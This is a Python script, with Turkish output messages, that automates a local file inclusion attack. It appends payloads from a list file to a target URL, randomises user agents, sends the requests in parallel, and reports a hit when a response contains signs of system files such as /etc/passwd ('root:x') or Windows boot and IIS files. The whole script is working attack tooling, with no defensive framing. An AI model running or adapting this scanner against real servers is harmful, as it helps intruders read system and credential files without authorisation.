import os
import sys
import time
import random
import OpenSSL
import argparse
import requests
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor


print(os.cpu_count())
LFI_LISTS = [lfi.strip() for lfi in open("PAYLOADS/lfi.txt")]
USERAGENT = [agent.strip() for agent in open('PAYLOADS/useragent.txt')]
TIME = time.time()


parse = argparse.ArgumentParser()
parse.add_argument('-u','--url',help='example: http://evil.com?file=')
args = parse.parse_args()
url = args.url


class lfi_scanner:

    def __init__(self,host):
        self.host = url


    def scans(self, LFI_LISTS):

        global USERAGENT

        try:

            req = requests.get(self.host + LFI_LISTS, headers={'User-Agent': random.choice(USERAGENT)}, timeout=2)
            req_Text = req.text



            if  "root:x"                             in req_Text or \
                "noexecute=optout"                   in req_Text or \
                "OC_INIT_COMPONENT"                  in req_Text or \
                "C:\WINDOWS\system32\Setup\iis.dll"  in req_Text:

                print(Fore.RED + "LFI BULUNDU ==>" + req.url + Style.RESET_ALL)
                print(req_Text[0:50])
                sys.exit()

            print(req.url)



        except requests.exceptions.ConnectionError:

            pass

        except OpenSSL.SSL.Error:

            pass

        except requests.exceptions.Timeout:

            pass

        except:

            pass



with ThreadPoolExecutor(max_workers=os.cpu_count() * 5) as executor:

    for _ in executor.map(lfi_scanner(url).scans, LFI_LISTS):

        executor.shutdown(wait=True)

        pass

now_time = time.time() - TIME
print("Geçen süre: "+str(now_time))
sys.exit()



